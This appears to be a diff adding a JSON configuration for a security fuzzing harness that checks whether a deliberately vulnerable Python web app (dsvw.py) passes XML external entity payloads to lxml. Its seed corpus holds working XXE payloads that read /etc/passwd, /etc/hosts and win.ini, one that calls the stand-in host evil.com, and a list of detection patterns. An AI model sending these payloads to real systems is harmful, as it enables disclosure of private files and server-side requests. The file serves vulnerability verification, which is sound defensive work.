@@ -1,0 +1,51 @@
+{
+  "monitor": {
+    "strategy": "recorded_call",
+    "patch_target": "lxml.etree.parse",
+    "target_arg_index": 0,
+    "target_arg_name": null,
+    "capture_what": "XML string passed to lxml.etree.parse",
+    "additional_imports": []
+  },
+  "oracle_check": {
+    "condition_description": "Payload contains XML external entity declarations or file inclusion patterns",
+    "trigger_patterns": [
+      "<!ENTITY",
+      "file://",
+      "http://",
+      "<!DOCTYPE",
+      "&[a-zA-Z0-9]+;"
+    ],
+    "raise_type": "RuntimeError",
+    "raise_message_template": "PY_PATH-INJECTION: XXE payload detected in XML input — captured={captured} pattern={matched_pattern}"
+  },
+  "fuzz_guidance": {
+    "seed_corpus": [
+      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><stockCheck><productId>&xxe;</productId></stockCheck>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://evil.com/\"> ]><root>&xxe;</root>",
+      "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\"> ]><data>&xxe;</data>",
+      "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hosts\"> ]><root>&xxe;</root>",
+      "<?xml version=\"1.0\"?><root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\"/></root>"
+    ],
+    "skip_condition": "not ('<!' in params.get('xml', '') and ('ENTITY' in params['xml'] or 'DOCTYPE' in params['xml']))"
+  },
+  "_meta": {
+    "function": "do_GET",
+    "file": "dsvw.py",
+    "input_strategy": "flask_view",
+    "function_signature": "def do_GET(self)",
+    "tainted_params": [
+      {
+        "name": "self.path",
+        "index": 0,
+        "type": "str"
+      }
+    ],
+    "target_id": "py_path_injection_dsvw_py_41",
+    "finding_id": "4",
+    "rule_id": "py/path-injection",
+    "rule_slug": "py_path-injection",
+    "model": "ollama/qwen3-coder:480b-cloud",
+    "source_finding_artifact": "/home/trieudai/Oraculum/output/python/realvuln-dsvw/verification_results/findings/finding_4_py_path-injection.json"
+  }
+}
